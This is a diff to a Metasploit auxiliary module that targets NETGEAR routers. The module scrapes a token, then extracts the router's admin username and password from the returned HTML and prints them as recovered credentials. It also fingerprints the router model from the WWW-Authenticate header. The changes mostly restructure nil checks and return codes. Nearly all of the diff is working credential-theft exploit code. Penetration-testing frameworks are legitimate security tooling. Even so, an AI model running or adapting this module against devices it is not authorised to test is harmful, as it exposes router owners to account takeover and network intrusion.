@@ -68,7 +68,6 @@ class MetasploitModule < Msf::Auxiliary
       marker_one = "id="
       marker_two = "\""
       token = scrape(res.to_s, marker_one, marker_two)
-
       if token.nil?
         print_error("#{rhost} is not vulnerable: Token not found")
         return
@@ -92,17 +91,19 @@ class MetasploitModule < Msf::Auxiliary
 
       username = scrape(raw_html, "Router Admin Username", "Router Admin Password")
       password = scrape(raw_html, "Router Admin Password", "You can")
-      username = username.strip!
-      password = password.strip!
-
-        if username == "" || password == ""
-          print_error("No Creds found")
-        else
-          print_good("Creds found: #{username}/#{password}")
-        end
+      if username.nil? || password.nil?
+        return Exploit::CheckCode::Safe
+      else  
+        username = username.strip!
+        password = password.strip!
+      end
+      if username == "" || password == ""
+        print_error("No Creds found")
+      else
+        print_good("Creds found: #{username}/#{password}")
+      end
     else
       print_error("#{rhost} is not vulnerable: Not a NETGEAR device")
-      return
     end
   end
 
@@ -115,22 +116,17 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
 
-    if res.nil?
-      print_error("#{rhost} returned an empty response")
-      return
+    # Checks for the `WWW-Authenticate` header in the response
+    if res.headers["WWW-Authenticate"]
+      data = res.to_s
+      marker_one = "Basic realm=\""
+      marker_two = "\""
+      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
+      print_good("Router is a NETGEAR router (#{model})")
+      return Exploit::CheckCode::Detected
     else
-      # Checks for the `WWW-Authenticate` header in the response
-      if res.headers["WWW-Authenticate"]
-        data = res.to_s
-        marker_one = "Basic realm=\""
-        marker_two = "\""
-        model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
-        print_good("Router is a NETGEAR router (#{model})")
-        return Exploit::CheckCode::Detected
-      else
-        print_error('Router is not a NETGEAR router')
-        return Exploit::CheckCode::Safe
-      end
+      print_error('Router is not a NETGEAR router')
+      return Exploit::CheckCode::Safe
     end
   end
 end
